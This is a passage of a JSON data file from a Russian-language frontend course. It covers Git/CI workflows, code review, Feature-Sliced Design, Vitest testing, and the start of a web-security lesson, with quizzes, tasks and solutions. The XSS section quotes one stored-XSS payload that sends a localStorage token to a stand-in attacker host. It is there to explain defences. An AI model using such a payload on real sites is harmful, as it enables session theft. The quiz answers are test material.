            "code": "# .github/workflows/ci.yml\nname: CI Pipeline\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: 'npm'\n\n      - run: npm ci          # Установка\n      - run: npm run lint     # ESLint\n      - run: npx tsc --noEmit # TypeScript\n      - run: npm run build    # Сборка",
            "title": "GitHub Actions CI/CD пайплайн",
            "explanation": "CI запускается на каждый push и PR. npm ci — детерминированная установка (без обновления lock-файла). Последовательно: lint → type check → build. Если хоть один шаг падает — PR блокируется."
          }
        }
      ],
      "seniorTips": [
        "git add -p (patch mode) — золотой стандарт: позволяет коммитить изменения по хункам, создавая атомарные коммиты. Один коммит = одно логическое изменение.",
        "Никогда не делайте force push (git push -f) в main. Это перезаписывает историю и ломает работу всей команды.",
        "npm ci вместо npm install в CI/CD — детерминированная установка строго по lock-файлу, без обновления зависимостей.",
        "Husky + lint-staged — автоматический запуск ESLint и Prettier при каждом git commit (pre-commit hook). Предотвращает попадание невалидного кода в репозиторий."
      ],
      "commonMistakes": [
        {
          "bad": "git add .\ngit commit -m \"fix\"",
          "good": "git add -p\ngit commit -m \"fix(cart): prevent\n  negative quantity on decrement\"",
          "reason": "Коммит 'fix' без scope и описания бесполезен в истории. git add . коммитит ВСЁ, включая отладочные console.log. Используйте git add -p и Conventional Commits."
        },
        {
          "bad": "git push -f origin main",
          "good": "git push origin feature/my-task",
          "reason": "Force push в main перезаписывает историю и ломает работу ВСЕЙ команды. Force push допустим ТОЛЬКО в вашей личной feature-ветке для cleanup перед PR."
        },
        {
          "bad": "// Зависимости в dependencies\n\"devDependencies\": {\n  \"react\": \"^19.1.0\"\n}",
          "good": "\"dependencies\": {\n  \"react\": \"^19.1.0\"\n},\n\"devDependencies\": {\n  \"vite\": \"^6.0.0\"\n}",
          "reason": "react нужен в runtime — он должен быть в dependencies. devDependencies не попадают в бандл при npm install --production. Путаница приводит к 'Module not found' в продакшене."
        }
      ],
      "keyTakeaways": [
        "Feature-Branch Workflow: каждая задача в отдельной ветке → Push → Pull Request → Code Review → Merge в main.",
        "Conventional Commits (`feat:`, `fix:`, `refactor:`, `docs:`, `chore:`) стандартизируют историю и позволяют автоматически генерировать CHANGELOG.",
        "Vite обеспечивает мгновенный HMR в dev-режиме и оптимизированную сборку через Rollup в продакшене.",
        "`dependencies` — runtime (react, zustand), `devDependencies` — инструменты (vite, eslint, prettier). Путаница ведёт к ошибкам в продакшене.",
        "CI/CD пайплайн (lint → type check → test → build → deploy) защищает main от сломанного кода. Если шаг падает — PR блокируется.",
        "`git add -p` для атомарных коммитов. Никогда не используйте `git push -f` в main."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"terminal\"></div>",
      "initialCss": "#terminal { background: #0a0e13; color: #2dff8a; font-family: 'JetBrains Mono', monospace; padding: 20px; min-height: 300px; border-radius: 8px; white-space: pre-wrap; }",
      "initialJs": "const term = document.getElementById('terminal');\nconst log = (msg) => term.textContent += '$ ' + msg + '\\n';\n\n// Симулируйте Git-воркфлоу\nlog('git checkout main');\nlog('git pull origin main');\n// Добавьте команды для создания ветки, коммитов и PR",
      "instructions": "Симулируйте полный Feature-Branch Workflow в терминале:\n1. Переключитесь на main и обновите\n2. Создайте ветку feature/todo-list\n3. Сделайте 3 коммита с Conventional Commits: feat, fix, style\n4. Push ветку\n5. Симулируйте merge в main\n6. Удалите ветку"
    },
    "task": {
      "title": "Настройка CI/CD для Vite-проекта",
      "scenario": "Вам поручили настроить CI/CD пайплайн для нового Vite + React + TypeScript проекта. Пайплайн должен автоматически проверять код при каждом PR.",
      "criteria": [
        "GitHub Actions workflow: .github/workflows/ci.yml",
        "Триггеры: push в main и pull_request в main",
        "Шаги: checkout, setup-node (v22), npm ci, lint, type check (tsc --noEmit), build",
        "package.json содержит скрипты: dev, build, lint, format",
        "ESLint конфиг с правилами: no-unused-vars, eqeqeq, no-var",
        "Prettier конфиг: singleQuote: true, semi: true, tabWidth: 2"
      ],
      "starterCode": {
        "html": "<!-- Создайте .github/workflows/ci.yml -->",
        "js": "// Создайте package.json с правильными скриптами"
      },
      "hints": [
        "Используйте actions/checkout@v4 и actions/setup-node@v4",
        "npm ci вместо npm install для детерминированной установки",
        "tsc --noEmit — проверка типов без генерации файлов",
        "Добавьте cache: 'npm' в setup-node для ускорения CI"
      ],
      "solution": {
        "html": "name: CI\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: 'npm'\n      - run: npm ci\n      - run: npm run lint\n      - run: npx tsc --noEmit\n      - run: npm run build",
        "explanation": "CI запускается на push и PR в main. npm ci — из lock-файла. Линтинг → Type Check → Build — любой падающий шаг блокирует мерж."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro2-q1",
          "question": "Какой Git-команде вы отдадите предпочтение для добавления изменений в staging area при создании атомарных коммитов?",
          "options": [
            "git add .",
            "git add -A",
            "git add -p",
            "git commit -a"
          ],
          "correctIndex": 2,
          "explanation": "git add -p (patch mode) позволяет интерактивно выбирать хунки (фрагменты изменений) для staging. Это ключевой инструмент для создания атомарных коммитов — один коммит = одно логическое изменение."
        },
        {
          "id": "pro2-q2",
          "question": "Какой формат коммита соответствует стандарту Conventional Commits для нового функционала в модуле авторизации?",
          "options": [
            "add login form",
            "feat(auth): add login form with validation",
            "FEATURE: login form added",
            "new: auth login form"
          ],
          "correctIndex": 1,
          "explanation": "Conventional Commits: type(scope): description. feat — новая функциональность, auth — модуль, после : — описание на английском в imperative mood. Позволяет автоматизировать CHANGELOG и SemVer."
        },
        {
          "id": "pro2-q3",
          "question": "В чём разница между npm install и npm ci?",
          "options": [
            "Нет разницы — синонимы",
            "npm ci устанавливает строго по lock-файлу без обновлений, npm install может обновлять зависимости",
            "npm ci работает быстрее, но не создаёт node_modules",
            "npm install используется только в CI/CD"
          ],
          "correctIndex": 1,
          "explanation": "npm ci (clean install) удаляет node_modules и устанавливает строго по package-lock.json — детерминированная установка. npm install может обновлять зависимости и менять lock-файл. В CI/CD всегда используйте npm ci."
        },
        {
          "id": "pro2-q4",
          "question": "Куда следует поместить библиотеку react в package.json?",
          "options": [
            "devDependencies — это инструмент разработки",
            "dependencies — react нужен в runtime",
            "peerDependencies — пусть пользователь сам поставит",
            "optionalDependencies — не обязательная зависимость"
          ],
          "correctIndex": 1,
          "explanation": "react нужен в runtime — приложение не работает без него. dependencies попадают в бандл. devDependencies (vite, eslint, typescript) — только инструменты, не попадают в бандл при npm install --production."
        },
        {
          "id": "pro2-q5",
          "question": "Что произойдёт, если один из шагов CI/CD пайплайна (например, npm run lint) завершится с ошибкой?",
          "options": [
            "Следующие шаги всё равно выполнятся",
            "Pull Request будет автоматически смержен",
            "Пайплайн остановится, PR будет заблокирован для мержа",
            "Ошибка будет проигнорирована"
          ],
          "correctIndex": 2,
          "explanation": "CI/CD пайплайн работает по принципу fail fast. Если любой шаг завершается с exit code !== 0, пайплайн останавливается. PR получает статус 'Checks failed' и блокируется для мержа. Это защищает main от сломанного кода."
        }
      ]
    }
  },
  {
    "id": "pro-3",
    "moduleId": "pro",
    "level": 3,
    "title": "Code Review, Архитектура проекта и Чистый код",
    "subtitle": "Культура Code Review, принципы SOLID/DRY/KISS, слои Feature-Sliced Design и автотесты",
    "description": "Освойте инженерные стандарты разработки: правила проведения и прохождения Code Review, принципы чистого кода во фронтенде, архитектурную методологию Feature-Sliced Design (FSD) и пирамиду автоматизированного тестирования с Vitest.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "code-review",
      "architecture",
      "fsd",
      "clean-code",
      "solid",
      "vitest",
      "testing"
    ],
    "theory": {
      "overview": "Написание работающего кода — лишь половина работы инженера. Вторая половина — сделать так, чтобы этот код был понятен коллегам, легко модифицировался через полгода и не ломал смежные части системы. В крупных продуктовых компаниях (Яндекс, VK, Т-Банк, Авито) код проходит строгие фильтры: автоматические тесты, линтеры и обязательный этап Code Review двумя сеньор-инженерами.\n\nВ этом уроке мы разберём, как организовать архитектуру frontend-приложения по методологии Feature-Sliced Design (FSD), как применять принципы SOLID и DRY без оверинжиниринга, и как писать поддерживаемые unit-тесты.",
      "sections": [
        {
          "title": "Культура и процесс Code Review в продуктовой команде",
          "content": "Code Review (ревью кода) — процесс проверки исходного кода Pull Request (PR) одним или несколькими разработчиками перед вливанием в основную ветку.\n\nЗачем нужно Code Review:\n1. Предотвращение попадания багов и уязвимостей в продакшен.\n2. Обмен знаниями: команда узнаёт о новых модулях, стажёры перенимают паттерны сеньоров.\n3. Поддержание единого архитектурного стиля и стандартов кодовой базы.\n\nПравила подготовки идеального Pull Request:\n- Атомарность: один PR решает ровно одну задачу (не более 200–300 строк изменений). Огромные PR на 2000 строк никто не читает внимательно.\n- Понятное описание: приложите ссылку на таску в Jira/YouTrack, опишите ЧТО изменилось и ПОЧЕМУ выбрано именно это решение.\n- Скриншоты и GIF: для UI-изменений всегда прикрепляйте визуальные подтверждения «До» и «После».\n- Саморевью: перед отправкой PR проверьте собственный diff на GitHub — удалите забытые console.log, временные комментарии и неиспользуемый код.\n\nЧеклист ревьюера (Reviewer Checklist):\n1. Архитектура: соблюдены ли границы слоев и модулей? Нет ли циклических зависимостей?\n2. Читаемость и чистота: понятны ли имена переменных и функций? Нет ли дублирования?\n3. Производительность: нет ли лишних ререндеров, утечек памяти в useEffect, неоптимизированных циклов?\n4. Безопасность: экранируются ли пользовательские данные (защита от XSS)?\n5. Тесты: покрыта ли новая бизнес-логика unit-тестами?",
          "codeExample": {
            "language": "bash",
            "code": "# Пример идеального описания Pull Request в GitHub / GitLab:\n\n## 📋 Задача\nCloses #PROJ-142: Добавление валидации формы оформления заказа\n\n## 🛠 Что сделано:\n- Создан модуль валидации `features/order-checkout/model/validation.ts`\n- Добавлены проверки: корректность email, маска телефона, проверка минимальной суммы корзины\n- Покрыта тестами чистая функция валидации (8 unit-тестов в Vitest)\n- Обновлены типы в `entities/order/model/types.ts`\n\n## 📸 Скриншоты UI:\n| До изменений | После (с валидацией) |\n|---|---|\n| [img-before.png] | [img-after.png] |\n\n## 🧪 Как протестировать:\n1. Перейти на страницу `/checkout`\n2. Нажать 'Оформить' с пустыми полями -> должны появиться красные подсказки\n3. Ввести корректные данные -> форма успешно отправляется",
            "title": "Шаблон идеального описания Pull Request",
            "explanation": "Чёткая структура PR с описанием контекста, списком изменений, скриншотами и инструкцией по тестированию ускоряет аппрув ревьюерами в 3 раза."
          }
        },
        {
          "title": "Принципы чистого кода во фронтенде (SOLID, DRY, KISS, YAGNI)",
          "content": "Фундаментальные принципы разработки программного обеспечения, адаптированные под современный Frontend:\n\n1. Single Responsibility Principle (SRP — Единственная ответственность):\nОдин модуль/компонент/функция должен отвечать ровно за одну вещь. Если компонент `<UserProfile />` одновременно делает fetch-запрос к API, парсит дату, валидирует форму и рендерит модалку — разделите его на кастомный хук `useUserData()`, утилиту `formatDate()` и презентационные компоненты.\n\n2. Open/Closed Principle (OCP — Открытость/Закрытость):\nКомпоненты должны быть открыты для расширения, но закрыты для модификации. Используйте паттерн композиции: передавайте компоненты через `children` или слоты, а не создавайте 20 булевых пропсов (`isModal`, `isDropdown`, `isCompact`, `withIcon`) внутри одного монструозного компонента.\n\n3. DRY (Don't Repeat Yourself — Не повторяйся):\nДублирующаяся логика выносится в утилиты и хуки. Однако помните правило Senior: «Небольшое дублирование лучше, чем неправильная абстракция» (Wrong Abstraction).\n\n4. KISS (Keep It Simple, Stupid — Делай проще):\nПишите самый простой и очевидный код, решающий задачу. Избегайте преждевременных паттернов проектирования там, где достаточно 5 строк чистого кода.\n\n5. YAGNI (You Aren't Gonna Need It — Вам это не понадобится):\nНе пишите код «на будущее» и не создавайте конфигурации для сценариев, которых ещё нет в требованиях бизнеса.",
          "codeExample": {
            "language": "javascript",
            "code": "// ❌ Нарушение SRP: спагетти-функция делает всё сразу\nfunction handleUserSubmitBad(e) {\n  e.preventDefault();\n  const email = e.target.email.value;\n  if (!email.includes('@')) {\n    alert('Неверный email');\n    return;\n  }\n  fetch('/api/users', { method: 'POST', body: JSON.stringify({ email }) })\n    .then(r => r.json())\n    .then(data => {\n      localStorage.setItem('token', data.token);\n      window.location.href = '/dashboard';\n    });\n}\n\n// ✅ Соблюдение SRP: разделение на изолированные функции\nconst validateEmail = (email) => email.includes('@');\nconst authService = {\n  login: async (email) => (await fetch('/api/users', { method: 'POST', body: JSON.stringify({ email }) })).json()\n};\nconst tokenStorage = {\n  save: (token) => localStorage.setItem('token', token)\n};",
            "title": "Применение принципа Single Responsibility во фронтенде",
            "explanation": "Разделение валидации, сетевого слоя и работы с хранилищем позволяет независимо тестировать и переиспользовать каждую часть."
          }
        },
        {
          "title": "Архитектура Feature-Sliced Design (FSD)",
          "content": "Feature-Sliced Design (FSD) — передовая архитектурная методология для масштабируемых фронтенд-приложений, ставшая стандартом в русскоязычном и мировом комьюнити.\n\nИерархия слоёв FSD (строго сверху вниз):\n\n1. `app/` — инициализация приложения: глобальные стили, роутинг, сторы, корневые провайдеры (React Query, ThemeProvider).\n2. `pages/` — композиция страниц приложения (компоненты роутера: `HomePage`, `LessonPage`, `ProfilePage`).\n3. `widgets/` — крупные самостоятельные UI-блоки, объединяющие несколько фичей (Header, Sidebar, UserCatalog, LessonView).\n4. `features/` — пользовательские интерактивные сценарии, несущие бизнес-ценность (AuthByEmail, AddToCart, FilterLessons, BookmarkTask).\n5. `entities/` — бизнес-сущности предметной области (User, Lesson, Course, Order) — содержат модели данных, типы, API-запросы и базовые карточки.\n6. `shared/` — переиспользуемый фундамент без привязки к бизнес-логике: UI Kit (Button, Input, Modal), API-клиент, хелперы, типы.\n\nЗолотое правило FSD:\nМодуль из конкретного слоя может импортировать код ТОЛЬКО из нижележащих слоёв! Запрещены циклические импорты и импорты между соседними слайсами одного слоя.",
          "image": {
            "src": "/images/lessons/code-review-architecture.svg",
            "alt": "Архитектура Feature-Sliced Design слои и пирамида тестирования Vitest",
            "caption": "Слои FSD: app -> pages -> widgets -> features -> entities -> shared. Импорты строго сверху вниз"
          },
          "codeExample": {
            "language": "bash",
            "code": "# Структура проекта по методологии Feature-Sliced Design (FSD):\nsrc/\n├── app/                 # Инициализация приложения, провайдеры, глобальные стили\n│   ├── providers/\n│   └── styles/index.css\n├── pages/               # Страницы приложения\n│   ├── LessonPage/\n│   └── DashboardPage/\n├── widgets/             # Крупные UI-блоки (Header, Sidebar)\n│   ├── Header/ui/Header.tsx\n│   └── CurriculumSidebar/\n├── features/            # Пользовательские фичи (сценарии)\n│   ├── AuthByEmail/\n│   └── RunCodeSandbox/\n├── entities/            # Бизнес-сущности (User, Lesson)\n│   ├── lesson/model/types.ts\n│   └── user/api/userApi.ts\n└── shared/              # Переиспользуемый базис (UI Kit, lib, api)\n    ├── ui/Button/\n    ├── api/httpClient.ts\n    └── lib/formatDate.ts",
            "title": "Файловая структура проекта на Feature-Sliced Design (FSD)",
            "explanation": "Чёткая изоляция слоёв гарантирует, что изменение одной фичи никогда случайно не сломает другую часть кодовой базы."
          }
        },
        {
          "title": "Пирамида автоматизированного тестирования с Vitest",
          "content": "Автоматизированное тестирование гарантирует, что написанный код работает корректно и защищён от регрессий при будущих изменениях.\n\nПирамида тестирования:\n\n1. Unit Tests (Модульные тесты — 70% объема):\n- Тестируют изолированные чистые функции, утилиты, парсеры, кастомные хуки и модели данных.\n- Быстрые (выполняются за миллисекунды), дешёвые в написании.\n- Инструменты: Vitest (быстрый аналог Jest на движке Vite), Jest.\n\n2. Integration Tests (Интеграционные тесты — 20% объема):\n- Тестируют совместную работу нескольких компонентов (форма + валидация + кнопка submit).\n- Инструменты: React Testing Library, Vitest.\n\n3. E2E Tests (End-to-End сквозные тесты — 10% объема):\n- Запускают настоящий браузер (Chromium/Firefox) и симулируют действия живого пользователя от клика до базы данных.\n- Медленные, дорогие в поддержке, но дают максимальную уверенность.\n- Инструменты: Playwright, Cypress.\n\nПаттерн AAA в написании тестов:\n- Arrange (Подготовка): инициализируем входные данные и моки.\n- Act (Действие): вызываем тестируемую функцию или рендерим компонент.\n- Assert (Проверка): проверяем, что результат совпадает с ожидаемым (`expect(result).toBe(expected)`).",
          "codeExample": {
            "language": "javascript",
            "code": "// src/shared/lib/math.test.ts — модульное тестирование на Vitest\nimport { describe, it, expect } from 'vitest';\n\n// Чистая функция расчета прогресса стажёра\nexport function calculateProgress(completedCount, totalCount) {\n  if (totalCount <= 0) return 0;\n  if (completedCount <= 0) return 0;\n  const percentage = Math.round((completedCount / totalCount) * 100);\n  return Math.min(percentage, 100);\n}\n\n// Тестовый набор (Test Suite):\ndescribe('calculateProgress()', () => {\n  it('корректно рассчитывает процент завершения', () => {\n    // Arrange & Act\n    const result = calculateProgress(3, 10);\n    // Assert\n    expect(result).toBe(30);\n  });\n\n  it('возвращает 0 при нулевом общем количестве', () => {\n    expect(calculateProgress(5, 0)).toBe(0);\n  });\n\n  it('ограничивает максимальный прогресс 100%', () => {\n    expect(calculateProgress(15, 10)).toBe(100);\n  });\n});",
            "title": "Unit-тестирование чистой функции с помощью Vitest",
            "explanation": "Тесты по шаблону Arrange-Act-Assert проверяют как стандартные сценарии (3 из 10 = 30%), так и граничные случаи (деление на 0, переполнение)."
          }
        }
      ],
      "seniorTips": [
        "При проведении Code Review оставляйте комментарии в формате: `[Nitpick]` (мелкая придирка, не блокирующая мерж), `[Question]` (вопрос по логике) или `[Blocker]` (критический баг).",
        "Пишите Unit-тесты в первую очередь для сложной бизнес-логики (расчет скидок, валидаторы, парсеры данных). Тестировать простые UI-компоненты-обёртки не имеет смысла.",
        "Следуйте правилу бойскаута: «Оставь кодовую базу чище, чем она была до тебя». При правке бага отрефакторьте окружающий код, если он написан грязно.",
        "В архитектуре FSD никогда не импортируйте код из соседних модулей того же слоя напрямую — используйте публичный интерфейс `index.ts` (Public API)."
      ],
      "commonMistakes": [
        {
          "bad": "// Создание PR размером в 3500 строк с сообщением 'update project'",
          "good": "// Разбиение крупной фичи на 4 последовательных атомарных PR по 200 строк с понятным описанием",
          "reason": "Гигантские PR физически невозможно качественно отрецензировать. Ревьюер проглядит критические баги и архитектурные нарушения."
        },
        {
          "bad": "// Импорт из вышележащего слоя в FSD:\n// Внутри entities/user/model.ts:\nimport { OrderWidget } from 'widgets/OrderWidget'; // ❌ Цикл!",
          "good": "// Соблюдение правила однонаправленного потока:\n// Внутри widgets/OrderWidget.tsx:\nimport { UserCard } from 'entities/user'; // ✅ Сверху вниз",
          "reason": "Импорт из вышележащего слоя создаёт жесткую циклическую связность (Spaghetti Code), делая модуль entities непригодным для повторного использования."
        },
        {
          "bad": "// Тестирование внутренних деталей реализации:\nexpect(component.state.count).toBe(1);",
          "good": "// Тестирование поведения с точки зрения пользователя:\nexpect(screen.getByRole('button')).toHaveTextContent('1');",
          "reason": "Тестирование деталей реализации делает тесты хрупкими: при смене внутреннего состояния без изменения поведения тест сломается."
        }
      ],
      "keyTakeaways": [
        "Code Review — инструмент обмена знаниями и защиты кодовой базы от багов. Идеальный PR: атомарный (до 300 строк), с описанием и скриншотами.",
        "Принцип Single Responsibility (SRP) требует, чтобы каждый модуль и компонент решал строго одну задачу.",
        "Feature-Sliced Design (FSD) структурирует проект по слоям `app` → `pages` → `widgets` → `features` → `entities` → `shared` с импортами строго сверху вниз.",
        "Пирамида тестирования состоит из быстрых Unit-тестов (70%), интеграционных тестов (20%) и сквозных E2E (10%).",
        "Тесты строятся по паттерну AAA (Arrange — Act — Assert) и проверяют поведение программы, а не внутренние детали реализации."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"test-runner\"></div>",
      "initialCss": "#test-runner {\n  font-family: 'JetBrains Mono', monospace;\n  background: #0a0e13;\n  color: #2dff8a;\n  padding: 16px;\n  border-radius: 8px;\n  border: 1px solid #30363d;\n  min-height: 220px;\n  white-space: pre-wrap;\n}",
      "initialJs": "const runner = document.getElementById('test-runner');\nconst log = (msg) => runner.textContent += msg + '\\n';\n\n// Мини-тест раннер в стиле Vitest:\nfunction test(name, fn) {\n  try {\n    fn();\n    log(`✔ PASS: ${name}`);\n  } catch (err) {\n    log(`✖ FAIL: ${name} -> ${err.message}`);\n  }\n}\n\nfunction expect(actual) {\n  return {\n    toBe(expected) {\n      if (actual !== expected) {\n        throw new Error(`Ожидалось ${expected}, получено ${actual}`);\n      }\n    }\n  };\n}\n\n// Тестируемая функция расчета скидки\nfunction getDiscountedPrice(price, discountPercent) {\n  if (price < 0 || discountPercent < 0) return 0;\n  if (discountPercent >= 100) return 0;\n  return price - (price * discountPercent) / 100;\n}\n\nlog('Запуск тестового набора Vitest:');\ntest('корректно вычисляет скидку 20% от 1000', () => {\n  expect(getDiscountedPrice(1000, 20)).toBe(800);\n});\ntest('возвращает 0 при скидке 100%', () => {\n  expect(getDiscountedPrice(500, 100)).toBe(0);\n});\ntest('корректно обрабатывает отрицательную цену', () => {\n  expect(getDiscountedPrice(-100, 10)).toBe(0);\n});",
      "instructions": "Практика тестирования и чистого кода:\n1. Изучите вывод мини-раннера Vitest в окне консоли\n2. Напишите функцию formatCurrency(amount, currency = 'RUB'), форматирующую число в вид '1 000 ₽'\n3. Напишите для неё 3 unit-теста с помощью функций test() и expect()"
    },
    "task": {
      "title": "Рефакторинг спагетти-модуля корзины и написание unit-тестов",
      "scenario": "Вы проводите рефакторинг интернет-магазина. Старый модуль корзины представлял собой гигантскую функцию, смешивающую UI, сетевые запросы и расчёты. Вам нужно разбить код по принципу Single Responsibility (SRP), выделить чистые функции расчёта стоимости и скидок и покрыть их тестами.",
      "criteria": [
        "Выделить чистую функцию calculateCartTotal(items, discountCode, promoMap)",
        "Функция должна обрабатывать скидки в процентах и фиксированные суммы",
        "Применить Guard Clauses для валидации входных данных (пустая корзина, некорректный промокод)",
        "Соблюдать неизменяемость (Immutability) — не мутировать исходный массив items",
        "Написать тестовый набор из 4 сценариев (обычный расчет, промокод, пустая корзина, переполнение скидки)",
        "Архитектурно разделить типы, сервис и расчетные функции"
      ],
      "starterCode": {
        "js": "// Исходный спагетти-код корзины для рефакторинга\nfunction calculateCartTotal(items, promoCode, promoMap) {\n  // Ваш чистый код здесь\n}"
      },
      "hints": [
        "Используйте Guard Clauses: if (!Array.isArray(items) || items.length === 0) return { subtotal: 0, discount: 0, total: 0 };",
        "Используйте items.reduce() для подсчета суммы: subtotal = items.reduce((sum, item) => sum + item.price * item.quantity, 0);",
        "Промокоды в promoMap: { 'SAVE10': { type: 'percent', value: 10 }, 'MINUS500': { type: 'fixed', value: 500 } }"
      ],
      "solution": {
        "js": "function calculateCartTotal(items = [], promoCode = '', promoMap = {}) {\n  if (!Array.isArray(items) || items.length === 0) {\n    return { subtotal: 0, discount: 0, total: 0 };\n  }\n\n  const subtotal = items.reduce((acc, item) => {\n    const price = Number(item.price) || 0;\n    const quantity = Number(item.quantity) || 1;\n    return acc + price * quantity;\n  }, 0);\n\n  let discount = 0;\n  const promo = promoMap[promoCode?.trim().toUpperCase()];\n\n  if (promo) {\n    if (promo.type === 'percent') {\n      discount = (subtotal * promo.value) / 100;\n    } else if (promo.type === 'fixed') {\n      discount = promo.value;\n    }\n  }\n\n  discount = Math.min(discount, subtotal);\n  const total = Math.max(0, subtotal - discount);\n\n  return {\n    subtotal: Math.round(subtotal),\n    discount: Math.round(discount),\n    total: Math.round(total)\n  };\n}",
        "explanation": "Функция написана по принципу SRP и чистых функций: использует Guard Clauses, не мутирует аргументы, поддерживает различные типы промокодов и гарантирует, что итоговая сумма не станет отрицательной."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro3-q1",
          "question": "Какое главное правило взаимодействия слоев в архитектурной методологии Feature-Sliced Design (FSD)?",
          "options": [
            "Любой модуль может импортировать любой другой модуль",
            "Модули могут импортировать код только из нижележащих слоев (однонаправленный поток сверху вниз)",
            "Все компоненты должны лежать в одной папке components/",
            "Слои features и widgets должны быть объединены"
          ],
          "correctIndex": 1,
          "explanation": "В Feature-Sliced Design строго действует правило однонаправленного потока импортов: вышележащие слои могут импортировать нижележащие (app -> pages -> widgets -> features -> entities -> shared), но никогда наоборот. Это исключает циклические зависимости и спагетти-код."
        },
        {
          "id": "pro3-q2",
          "question": "В чём заключается принцип Single Responsibility Principle (SRP) из SOLID применительно к фронтенду?",
          "options": [
            "Каждый файл должен содержать не более 10 строк кода",
            "Каждый компонент или модуль должен отвечать ровно за одну задачу или обязанность",
            "В проекте должен быть только один разработчик",
            "Все функции должны возвращать только один тип данных"
          ],
          "correctIndex": 1,
          "explanation": "Принцип единственной ответственности (SRP) требует, чтобы у модуля/компонента была ровно одна причина для изменения. Разделение бизнес-логики, UI-рендеринга и сетевых запросов делает кодовую базу модульной и тестируемой."
        },
        {
          "id": "pro3-q3",
          "question": "Какую долю в классической пирамиде автоматизированного тестирования должны занимать быстрые модульные Unit-тесты?",
          "options": [
            "Около 10%",
            "Около 70%",
            "0% — достаточно только ручного тестирования",
            "100% — другие виды тестов не нужны"
          ],
          "correctIndex": 1,
          "explanation": "В пирамиде тестирования Unit-тесты составляют основание (около 70% от всех тестов). Они проверяют чистые функции, утилиты и хуки за миллисекунды, обеспечивая быструю обратную связь при разработке."
        },
        {
          "id": "pro3-q4",
          "question": "Что означает аббревиатура AAA в методологии написания тестов?",
          "options": [
            "Always Async Await",
            "Arrange (Подготовка) — Act (Действие) — Assert (Проверка)",
            "Automate All Apps",
            "Action Authentication Authorization"
          ],
          "correctIndex": 1,
          "explanation": "Паттерн AAA (Arrange — Act — Assert) — стандартизированная структура модульного теста: сначала подготавливаем тестовые данные (Arrange), затем вызываем тестируемую функцию (Act), и в конце проверяем результат через expect (Assert)."
        },
        {
          "id": "pro3-q5",
          "question": "Что из перечисленного является антипаттерном при подготовке Pull Request на Code Review?",
          "options": [
            "Добавление скриншотов до/после для UI-изменений",
            "Создание гигантского PR на 3000 строк изменений, объединяющего 5 несвязанных фичей и рефакторинг",
            "Прикрепление ссылки на задачу в трекере",
            "Предварительное проведение саморевью собственного diff"
          ],
          "correctIndex": 1,
          "explanation": "Создание гигантских неатомарных PR на тысячи строк — грубейший антипаттерн командной разработки. Такие PR невозможно качественно проверить, и они неизбежно приводят к конфликтам мержа и пропускам багов."
        }
      ]
    }
  },
  {
    "id": "pro-4",
    "moduleId": "pro",
    "level": 4,
    "title": "Безопасность фронтенда (Web Security) и Web API",
    "subtitle": "XSS, CSRF, SameSite Cookies, CORS, CSP и безопасное хранение токенов",
    "description": "Освойте критически важные аспекты веб-безопасности: защиту от межсайтового скриптинга (XSS), предотвращение подделки запросов (CSRF), правильную настройку CORS, политику Content Security Policy (CSP) и безопасное хранение JWT токенов.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "security",
      "xss",
      "csrf",
      "cors",
      "csp",
      "jwt",
      "cookies",
      "owasp"
    ],
    "theory": {
      "overview": "Безопасность — фундаментальное требование к любому коммерческому веб-приложению. Уязвимость во фронтенде может привести к краже сессий пользователей, утечке персональных данных (ПДн), краже денежных средств или компрометации административных панелей.\n\nПо статистике OWASP Top 10, атаки на клиентскую часть (XSS, CSRF, небезопасные зависимости) составляют более 40% всех успешных взломов. В этом уроке мы детально изучим архитектурные векторы атак и механизмы защиты: санитизацию данных, флаги кук `HttpOnly` / `SameSite`, заголовки CORS и политики Content Security Policy.",
      "sections": [
        {
          "title": "XSS (Cross-Site Scripting — Межсайтовый скриптинг)",
          "content": "XSS — это уязвимость, позволяющая злоумышленнику внедрить и выполнить произвольный JavaScript-код в браузере жертвы от имени вашего доверенного сайта.\n\nТипы XSS-атак:\n\n1. Stored XSS (Хранимая XSS — самая опасная):\nЗловредный скрипт сохраняется в базе данных (например, в тексте комментария: `<script>fetch('https://hacker.ru/steal?t=' + localStorage.getItem('token'))</script>`) и автоматически выполняется у ВСЕХ пользователей, открывших эту страницу.\n\n2. Reflected XSS (Отражённая XSS):\nСкрипт передаётся в параметрах URL (`https://site.ru/search?q=<script>...`) и сервер отражает его обратно в HTML-ответ без экранирования.\n\n3. DOM-based XSS (XSS в DOM-дереве):\nСкрипт внедряется полностью на клиенте через небезопасные JavaScript API: `element.innerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `location.href = 'javascript:...'`.\n\nКомплексная защита от XSS:\n- Никогда не используйте `innerHTML` с непроверенными пользовательскими данными — используйте `textContent` или `innerText` (они автоматически экранируют HTML-сущности).\n- В React/Vue JSX экранирует строки по умолчанию. Будьте предельно осторожны с `dangerouslySetInnerHTML`!\n- Санитизация HTML через библиотеку `DOMPurify` (`DOMPurify.sanitize(dirtyHtml)`), если необходимо рендерить форматированный богатый текст (Rich Text).\n- Храните критические токены аутентификации в `HttpOnly Cookies`, а не в `localStorage` (к `HttpOnly` кукам JavaScript не имеет доступа даже при успешной XSS-атаке!).",
          "image": {
            "src": "/images/lessons/web-security-xss-csrf.svg",
            "alt": "Схемы атак XSS, CSRF и механизм CORS",
            "caption": "Защита от XSS: DOMPurify и HttpOnly. Защита от CSRF: SameSite Cookies и анти-CSRF токены"
          },
          "codeExample": {
            "language": "javascript",
